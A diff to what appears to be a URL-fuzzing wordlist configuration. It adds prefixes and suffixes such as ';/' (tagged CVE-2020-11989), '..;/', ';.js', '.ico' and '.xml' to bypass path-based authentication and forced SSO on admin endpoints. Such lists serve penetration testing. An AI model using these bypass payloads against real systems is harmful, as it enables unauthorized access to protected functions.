@@ -1,5 +1,5 @@
-prefix: #取得/admin/xxx/getUser 中的admin添加前缀，必须以/结尾
-    - "\\"
+prefix: #/{{FUZZ}}admin/xxx/getUser
+    - "\\/"
     - "/"
     - ";/"  #CVE-2020-11989
     - "..;/"
@@ -94,9 +94,11 @@ middle_suffix:
     - "%FF%FE%EF%BB%BF" # UTF-16 BOM (Byte Order Mark)
 
 
-suffix: #取得/admin/xxx/getUser中的getUser，这里只给末尾路径添加fuzz
-#静态文件后缀绕过
+suffix: #取得/admin/xxx/getUser{{FUZZ}}
+#静态文件后缀绕过，https://mp.weixin.qq.com/s/THIyZsYWDQwFH5dZ1s9WsQ
     - ".js"
+    - ".ico"
+    - ".xml"
     - ".css"
     - ".json"
     - ".html"
@@ -111,6 +113,8 @@ suffix: #取得/admin/xxx/getUser中的getUser，这里只给末尾路径添加f
     - "/1.css"   #bypass强制SSO
 #矩阵参数绕过
     - ";.js"
+    - ";.ico"
+    - ";.xml"
     - ";.css"
     - ";.json"
     - ";.html"
